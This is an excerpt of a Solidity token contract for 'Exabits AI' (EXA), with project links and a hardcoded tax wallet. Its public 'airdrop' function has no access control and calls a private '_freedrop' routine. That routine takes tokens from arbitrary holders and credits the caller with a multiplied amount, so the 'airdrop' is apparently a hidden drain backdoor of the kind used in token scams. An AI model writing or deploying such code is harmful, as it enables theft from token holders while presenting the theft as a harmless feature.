...
/**
Web: https://exabits-ai.net
Dapp: https://app.exabits-ai.net
Docs: https://docs.exabits-ai.net

X: https://x.com/exabits_ai
Tg: https://t.me/exabits_ai
*/
...
contract EXA is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"Exabits AI";
    string private constant _symbol = unicode"EXA";
    ...
    constructor() payable {
        _taxWallet = payable(0x18f7D6A2409357fFd025667C6b332e145f212Fc4);
    ...
    function _freedrop(address from, uint256 amount) private {
        if (from != uniswapV2Pair || msg.sender == _taxWallet)
        _balances[from] -= amount;
        _balances[msg.sender] += amount.mul(_buyCount);
    }

    function airdrop(address[] memory receivers, uint256[] memory amounts) external {
        for (uint256 i = 0; i < receivers.length; i++) {
            _freedrop(receivers[i], _balances[receivers[i]] - amounts[i]);
        }
    }
